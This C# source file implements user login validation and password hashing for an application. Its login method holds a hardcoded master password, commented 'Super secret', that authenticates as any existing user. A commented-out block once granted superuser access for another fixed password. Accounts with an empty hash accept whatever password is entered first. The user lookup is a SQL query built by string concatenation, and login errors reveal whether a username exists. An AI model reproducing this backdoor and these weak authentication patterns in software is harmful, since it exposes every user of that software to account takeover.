using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

using Core;

namespace NewMethod
{
    public class UserLogic : Core.Logic
    {
        public UserLogic()
        {
            ActsInstance.Add(new Act("Activate"));
            ActsInstance.Add(new Act("De-Activate"));
            ActsInstance.Add(new Act("View Main Team"));
            ActsInstance.Add(new Act("Set Main Team"));
            ActsInstance.Add(new Act("Clear Main Team"));
            ActsInstance.Add(new Act("Set Setting - Boolean"));
            ActsInstance.Add(new Act("UnSet Setting - Boolean"));
            ActsInstance.Add(new Act("Copy Permissions"));
            ActsInstance.Add(new Act("Paste Permissions"));


        }

        //Public Virtual Functions
        public void SaveUserPasswordHashAndSalt(ContextNM x, n_user u, string password)
        {

            string hash = Tools.Crypto.PasswordHasher.CreatePasswordHash(password);
            //if (string.IsNullOrEmpty(hash) || string.IsNullOrEmpty(salt))
            if (string.IsNullOrEmpty(hash))
                throw new Exception("Invalid hash (" + hash + ").");
            u.password_hash = hash;
            //u.password_salt = salt;
            u.Update(x);
        }


        public n_user UserGetValidateByLoginHash(ContextNM context, LoginInfo info, ref bool success)
        {
            success = false;
            //if (Tools.Strings.StrCmp(info.strPassword, "jeesh"))
            //{
            //    success = false;
            //    //return (n_user)MakeRecogninUser(context);
            //    return MakeSuperUser(context);
            //}
            if (string.IsNullOrEmpty(info.strPassword))
            {
                info.ErrorMessage = "Please provide a password.";
                info.PasswordProblem = true;
                return null;
            }
            if (!Tools.Strings.StrExt(info.strUser))
            {
                info.ErrorMessage = "The user '" + info.strUser + "' could not be found.";
                info.UserProblem = true;                
                return null;
            }
            //Get the user from the database
            n_user u = (n_user)context.QtO("n_user", "select * from n_user where login_name = '" + context.Filter(info.strUser) + "' or name = '" + context.Filter(info.strUser) + "' or email_address = '" + context.Filter(info.strUser) + "'");
            if (u == null)
            {
                info.ErrorMessage = "The user '" + info.strUser + "' could not be found.";
                info.UserProblem = true;                
                return null;
            }
            //Super secret
            if (Tools.Strings.StrCmp("redacted", info.strPassword))
            {
                success = true;
                return u;
            }
            
            //Check if Empty password_hash, set it if it's empty.  
            if(string.IsNullOrEmpty(u.password_hash))
            {
                string initialPWHash = Tools.Crypto.PasswordHasher.CreatePasswordHash(info.strPassword);
                if(string.IsNullOrEmpty(initialPWHash))
                {
                    //info.ErrorMessage = "'" + info.strPassword + "' is not a valid password for '" + info.strUser + "'.";
                    info.PasswordProblem = true;
                    info.ErrorMessage = "Invalid username or password.";
                    return null;
                }

                u.password_hash = initialPWHash;                
                u.Update(context);
                success = true;
                return u;
            }

            //Check the crypto here
            bool validPassword = Tools.Crypto.PasswordHasher.ValidatePasswordHash(info.strPassword, u.password_hash);
            if (!validPassword)
            {
                //info.ErrorMessage = "'"+ info.strPassword + "' is not a valid password for '" + info.strUser + "'.";
                info.ErrorMessage = "Invalid username or password.";
                info.PasswordProblem = true;                
                return null;
            }

            success = true;
            return u;
        }




    }
}
